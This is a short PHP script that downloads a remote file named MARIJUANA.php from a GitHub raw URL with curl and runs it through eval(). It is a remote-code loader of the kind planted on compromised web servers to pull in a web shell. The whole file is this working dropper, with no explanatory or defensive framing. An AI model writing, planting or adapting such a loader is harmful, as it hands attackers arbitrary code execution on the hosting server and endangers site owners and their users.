<?php 
$url = "https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
